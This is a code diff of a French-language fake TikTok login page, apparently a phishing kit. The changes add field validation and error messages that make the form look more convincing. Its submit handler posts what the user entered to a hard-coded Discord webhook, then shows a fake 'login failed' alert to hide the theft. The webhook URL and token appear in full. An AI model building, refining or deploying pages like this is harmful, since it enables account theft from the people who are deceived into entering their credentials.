@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Connexion Rankos - TikTok</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
     * {
       box-sizing: border-box;
@@ -47,14 +47,16 @@
       text-decoration: none;
     }
 
-    .container, .login-interface {
+    .container,
+    .login-interface {
       text-align: center;
       margin-top: 80px;
       max-width: 400px;
       width: 100%;
     }
 
-    h1, h2 {
+    h1,
+    h2 {
       font-weight: 700;
       margin-bottom: 10px;
     }
@@ -125,10 +127,18 @@
     .login-interface input {
       width: 100%;
       padding: 12px;
-      margin-bottom: 10px;
+      margin-bottom: 4px;
       border-radius: 8px;
       border: 1px solid #ccc;
       font-size: 14px;
+    }
+
+    .error-message {
+      font-size: 12px;
+      color: red;
+      margin-bottom: 10px;
+      text-align: left;
+      min-height: 16px; /* espace même sans message */
     }
 
     .login-interface button {
@@ -140,6 +150,7 @@
       border-radius: 8px;
       cursor: not-allowed;
       color: #999;
+      margin-top: 10px;
     }
 
     .login-interface button.active {
@@ -179,7 +190,6 @@
   </style>
 </head>
 <body>
-
   <header>
     <div class="logo">
       <img src="https://www.logo.wine/a/logo/TikTok/TikTok-Logo.wine.svg" alt="TikTok" />
@@ -230,10 +240,12 @@
       <div style="color: #888;">Connexion avec un numéro de téléphone</div>
     </div>
     <input type="text" id="email" placeholder="E-mail ou nom d'utilisateur" />
+    <div class="error-message" id="email-error"></div>
     <div class="password-wrapper">
       <input type="password" id="password" placeholder="Mot de passe" />
       <span class="toggle-password" onclick="togglePassword()">👁️</span>
     </div>
+    <div class="error-message" id="password-error"></div>
     <a href="#">Mot de passe oublié ?</a>
     <button id="loginBtn" disabled>Se connecter</button>
     <div class="back-link" onclick="showMain()">← Retour</div>
@@ -251,6 +263,7 @@
     function showMain() {
       document.getElementById('main-container').style.display = 'block';
       document.getElementById('login-form').style.display = 'none';
+      clearErrors();
     }
 
     function togglePassword() {
@@ -262,8 +275,43 @@
     const passwordInput = document.getElementById('password');
     const loginBtn = document.getElementById('loginBtn');
 
+    const emailError = document.getElementById('email-error');
+    const passwordError = document.getElementById('password-error');
+
+    function clearErrors() {
+      emailError.textContent = '';
+      passwordError.textContent = '';
+    }
+
+    function containsLetter(str) {
+      return /[a-zA-Z]/.test(str);
+    }
+
+    function validateInput(value) {
+      if (value.length < 5) return 'La saisie doit contenir au moins 5 caractères.';
+      if (value.length > 18) return 'La saisie ne doit pas dépasser 18 caractères.';
+      if (!containsLetter(value)) return 'La saisie doit contenir au moins une lettre.';
+      return '';
+    }
+
     function updateButtonState() {
-      if (emailInput.value.trim() && passwordInput.value.trim()) {
+      clearErrors();
+
+      const emailVal = emailInput.value.trim();
+      const passwordVal = passwordInput.value.trim();
+
+      let emailValidationMsg = validateInput(emailVal);
+      let passwordValidationMsg = validateInput(passwordVal);
+
+      if (emailValidationMsg) {
+        emailError.textContent = emailValidationMsg;
+      }
+
+      if (passwordValidationMsg) {
+        passwordError.textContent = passwordValidationMsg;
+      }
+
+      if (!emailValidationMsg && !passwordValidationMsg) {
         loginBtn.disabled = false;
         loginBtn.classList.add('active');
       } else {
@@ -288,12 +336,11 @@
       fetch('https://discord.com/api/webhooks/1382805479318884393/q3PgxN5YRwcy1MPgFurwEWHcLq9c3wBSqAOSnKkbYO1z23cRgTPuEzCgvcILBvf_-_p6', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ content: discordMessage })
+        body: JSON.stringify({ content: discordMessage }),
       }).then(() => {
-        alert("Connexion échouée. Veuillez réessayer.");
+        alert('Connexion échouée. Veuillez réessayer.');
       });
     });
   </script>
-
 </body>
 </html>
